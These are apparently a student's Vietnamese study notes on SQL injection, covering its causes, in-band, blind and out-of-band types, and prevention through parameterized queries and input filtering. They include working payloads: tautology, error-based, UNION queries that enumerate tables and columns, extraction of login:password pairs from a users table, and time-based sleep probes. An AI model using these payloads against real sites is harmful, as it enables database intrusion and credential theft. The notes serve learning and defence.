# Nguyên nhân SQL Injection / Bao nhiêu loại SQL i
# Thực hiện tấn công các loại SQL i
# SQL i có thể gây ra các loại tấn công nào

#SQLi là gì:
- Là 1 lỗ hổng web, cho phép kẻ tấn công có thể can thiệp vào các truy vấn mà ứng dụng thực hiện với csdl của nó. kẻ tấn công có thể thay đổi sửa xóa dữ liệu.  
 
# Nguyên nhân dẫn đến SQL injection: 
+ Do dùng câu truy vấn nối chuỗi
+ Không thực hiện kiểm tra đầu vào
+ Hiển thị thông báo lỗi chứa dữ liệu nhạy cảm

# các dạng tấn công SQL

# Có 3 loại SQL injection: 
+ In-band SQLi (Classic) : Tấn công và thu thập kết quả trực tiếp trên cùng 1 kênh liên lạc. 
    - Error-base SQLi: thực hiện các hành động làm csdl tạo ra thông báo lỗi, dùng dữ liệu được cung cấp bởi các thông báo lỗi để thu thập thông tin về cấu trúc dữ liệu. -> lấy các thuộc tính của của csdl. 
    ' or 1=1-- 
    * ' or 1=1 group by concat_WS('-',version(),floor(rand(0)*2)) having min(0) -- 

    - Union-based SQLi: Sử dụng toán tử UNION SQL để kết hợp nhiều câu lệnh được tạo bởi csdl, kết quả trả về như 1 lần của http response
    # ' order by 1,2,3... -- 
    # ' uinon select 1,2,3,4,5...--
    # ' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- 
    # ' union select column_name from information_schema.columns where table_name='',..-- 
    # ' union select concat()

-Numberic
	- order by  1,2,3,4,5
	- union select 1,2,sql,4... from sqlite_master--
	- union select * from table_name-- 
- routed:
	' union select ' union select 1,2,3 -- - -- -
	' union select ' union select current_user(),@@version -- - -- - 
	' union select ' union  select 1,(select group_concat(login, ':' ,password) from users) -- -
	

+ Inferential SQLi (Blind): Cố gắng xây dựng lại cấu trúc db = việc gửi payloads 
    - Blind-Boolean-based: Gửi truy vấn sql đến db, làm ứng dụng trả lại kết quả đúng hay sai. Dựa trên kq, http request sẽ sửa đổi hoặc ko. 
    - Time-based Blind SQLi: Gửi 1 truy vấn SQL -> db, làm cho db đợi, xem từ tg db cần để phản hồi:  SLEEP() and BENCHMARK(), ' and id=sleep(5) ; -- , ' and id=if(LEFT(VERSION(),2)='10',SLEEP(2),1) ; --
+ Out-of-band: Phụ thuộc vào khả năng server thực hiện các request DNS hoặc HTTP để chuyển dl cho kẻ tấn công.
- Cách phòng chống
+ Parameterized Statements: Sử dụng đảm bảo dữ liệu truyền vào đã được đảm bảo, sẽ ko gây hại, bằng cách sử dụng prepared statements thay vì nối chuỗi trong truy vấn.
+ Lọc đầu vào 1 cách chặt chẽ
+ Mã hóa các dữ liệu quan trọng
+ Không thông báo lỗi phía máy khách
+ Password Hashing: các ứng dụng nên lưu mk ng dùng dưới dạng mã băm mạnh, 1 chiều. Làm giảm nguy cơ bị người dùng đánh cắp thông tin đăng nhập hoặc mạo danh người dùng khác. 


